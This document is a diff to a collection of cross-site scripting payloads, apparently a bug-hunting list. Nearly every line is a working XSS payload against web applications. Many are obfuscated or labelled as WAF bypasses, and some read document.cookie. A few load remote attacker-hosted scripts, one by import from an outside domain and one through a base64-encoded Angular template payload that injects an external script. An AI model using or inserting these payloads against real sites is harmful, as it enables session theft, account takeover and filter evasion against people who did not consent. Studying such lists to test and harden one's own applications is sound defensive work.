@@ -4,6 +4,16 @@ OnXSS=<Img/Src/OnError=(alert)(1)>
 a onclick="alert(1)">XSS</a>
 <svg onload=alert(1)>
 "><img src="x:x" onerror=alert('xss')>
+-->"/><img src=@ onerror=prompt(document.cookie)>
+">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(cloudfrontbypass)//'>
+'"><img src=x onerror=alert("xss!")>.pdf
+"\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\>
+'"()><img src="x"><a href="https://google.com">click</a>
+1'"><img/src/onerror=.1|prompt``>
+"><img src=x onerror=prompt(1);>
+"><img/src=x onerror="𐂃='',𐃨=!𐂃+𐂃,𐂝=!𐃨+𐂃,𐃌=𐂃+{},𐁉=𐃨[𐂃++],𐃵=𐃨[𐂓=𐂃],𐀜=++𐂓+𐂃,𐂠=𐃌[𐂓+𐀜],𐃨[𐂠+=𐃌[𐂃]+(𐃨.𐂝+𐃌)[𐂃]+𐂝[𐀜]+𐁉+𐃵+𐃨[𐂓]+𐂠+𐁉+𐃌[𐂃]+𐃵][𐂠](𐂝[𐂃]+𐂝[𐂓]+𐃨[𐀜]+𐃵+𐁉+'(document.domain)')()"
+'"><img src=x onerror=alert()>
+/</title><img src=x onerror="confirm('Hacked_By_h6nt3r')">
 <iframe src=javascript:alert(1)>
 <body onload=alert('XSS')>
 '"><svg/onload=import('https://lostsec.xyz/coffin/xss.js')>
@@ -48,7 +58,7 @@ a onclick="alert(1)">XSS</a>
 /svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS via SVG!')"><circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" /></svg>
 <svg xmlns="http://www.w3.org/2000/svg"><script>prompt("XSS")</script></svg>
 "><svg/onload=setTimeout`${'ale'+'rt'}(1)`>
-/<jxahmad282>=()?><svg/onload=\u0063onfirm('hacked_by_hunter')>
+/<jxahmad282>=()?><svg/onload=\u0063onfirm('hacked_by_h6nt3r')>
 %3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cscript%3Eprompt%28%22XSS%22%29%3C%2Fscript%3E%3C%2Fsvg%3E
 <svg+onload%3Dalert%26%230000000040+"1")> –
 ab@gmail.com'\"><svg/onload=alert(/xss/)>
@@ -58,7 +68,6 @@ ab@gmail.com'\"><svg/onload=alert(/xss/)>
 <select><noembed></select><script x='a@b'a> y='a@b'//a@b%0a\u0061lert('CYBERTIX')</script x>
 <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
 <bla tabindex=1 onblur=alert(1) autofocus></bla><meta http-equiv="refresh" content=1;URL=mailto:someone@example.com">
--->"/><img src=@ onerror=prompt(document.cookie)>
 <details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;lert&#x000000028;origin&#x000029;>
 <dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
 <dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()%20x>
@@ -74,7 +83,6 @@ java%0D%0Ascript%0D%0A:alert(document.domain)
 ">|<img src=x onerror=alert(document.domain)>
 <Img Src=OnXSS OnError=confirm(1337)>
 ';window/*aabb*/['al'%2b'ert'](document./*aabb*/location);//
-">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(cloudfrontbypass)//'>
 lert&#x000000028;origin&#x000029;>
 /(A(%22onerror='alert%60123%60'test))/
 http://example.com/services"><script>alert(1)</script>/services/
@@ -92,7 +100,6 @@ javascript:var a="ale";var b="rt";var c="()";decodeURI("<button popovertarget=x>
 1%22onfocus=%27window.alert%28document.cookie%29%27%20autofocus=
 "><𝘀𝘃𝗴+𝗼𝗻𝗹𝗼𝗮𝗱=𝗰𝗼𝗻𝗳𝗶𝗿𝗺(𝗰𝗼𝗼𝗸𝗶𝗲)>
 - 1'"();<test><ScRiPt >window.alert("XSS_WAF_BYPASS")
-'"><img src=x onerror=alert("xss!")>.pdf
 "><input%252bTyPE%25253d"hxlxmj"%252bSTyLe%25253d"display%25253anone%25253b"%252bonfocus%25253d"this.style.display%25253d'block'%25253b%252bthis.onfocus%25253dnull%25253b"%252boNMoUseOVer%25253d"this['onmo'%25252b'useover']%25253dnull%25253beval(String.fromCharCode(99,111,110,102,105,114,109,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))%25253b"%252bAuToFOcus>
 &#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt;
 "><track/onerror='confirm`1`'>
@@ -124,7 +131,6 @@ javascript:%ef%bb%bfalert(XSS)
 "`'><script>\xE2\x80\x87javascript:alert(1)</script>
 <img/src=x onError="`${x}`;alert(`Hello`);">
 "`'><script>\xE2\x80\x87javascript:alert(1)</script>
-"\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\>
 &#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt;
 ‘ale’%2B‘rt’%2Blocation.hash.substr(1)>#(1)
 /ale/.source%2B/rt/.source%2Blocation.hash.substr(1)>#(1)
@@ -149,7 +155,6 @@ javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain
 <script>prompt(document.domain);</script>
 {{0[a='constructor'][a]('alert(1)')()}}
 <00 foo="<a%20href="javascript:alert('XSS-Bypass')">XSS-CLick</00>--%20/
-'"()><img src="x"><a href="https://google.com">click</a>
 <input type=hidden oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto>
 {{constructor.constructor('eval(atob(\'dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3Rlc3QtdGVzdCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTsmIzYxOyYjNjE=\'))')()}}
 </script><iframe src=javascript:alert()>
@@ -169,13 +174,10 @@ incapsula bypass: <iframe/onload="var b ='document.domain)'; var a = 'JaV' + 'as
 Testing%22+data-toggle%3Dcollapse+data-target%3D%3Cimg%26%23x20%3Bsrc%3Dx%26%23x20%3Bon%26%23x65%3Brror%3Dalert%28document.domain%29%26%23x3e%3B%22
 1"-top["con\146irm"](1)-"
 "></scri%0Apt><script>prompt(`Got%20an%20XSS%20would%20you%20like%20to%20say%20something?`)%3B<%2Fscript>
-1'"><img/src/onerror=.1|alert``>
-"><img src=x onerror=prompt(1);>
 xyz,test");alert(origin);//
 javascript:const originx="hacked by h6nt3r",var{a:onerror}={a:%2561lert};throw originx
 <address onscrollsnapchange=window['ev'+'a'+(['l','b','c'][0])](window['a'+'to'+(['b','c','d'][0])]('YWxlcnQob3JpZ2luKQ==')); style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></address>
 <<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert(document.cookie)"';>
-"><img/src=x onerror="𐂃='',𐃨=!𐂃+𐂃,𐂝=!𐃨+𐂃,𐃌=𐂃+{},𐁉=𐃨[𐂃++],𐃵=𐃨[𐂓=𐂃],𐀜=++𐂓+𐂃,𐂠=𐃌[𐂓+𐀜],𐃨[𐂠+=𐃌[𐂃]+(𐃨.𐂝+𐃌)[𐂃]+𐂝[𐀜]+𐁉+𐃵+𐃨[𐂓]+𐂠+𐁉+𐃌[𐂃]+𐃵][𐂠](𐂝[𐂃]+𐂝[𐂓]+𐃨[𐀜]+𐃵+𐁉+'(document.domain)')()"
 top[8680439..toString(30)](document.domain)
 +ADw-script+AD4-alert(1)+ADw-/script+AD4-
 javascript:alert’1’
@@ -183,10 +185,8 @@ javascript:alert’1’
 <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js"></script><div ng-app ng-csp><button ng-click="$event.target.ownerDocument.defaultView.alert(document.domain)">Click me</button></div>
 '<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?'
 "/><hTML%09OnMoUseOVeR%0a=%0a(confirm)()//
-'"><img src=x onerror=alert()>
 "><input type="text" oncontentvisibilityautostatechange="confirm(/Bypassed/)">
 https:///%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E
-/</title><img src=x onerror="alert('hacked')">
 <address onscrollsnapchange=window['ev'+'a'+(['l','b','c'][0])](window['a'+'to'+['b','c','d'][0]]('YWxlcnQob3JpZ2luKQ==')); style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></address>
 /* </script> &#x3c;img/src/ <script>window[/al/.source+/ert/.source](origin);</script> /> */
 a=eval,c=["a"],x=["lert"],t=\${c}${x}(origin)`,http://a.call`1${t}``
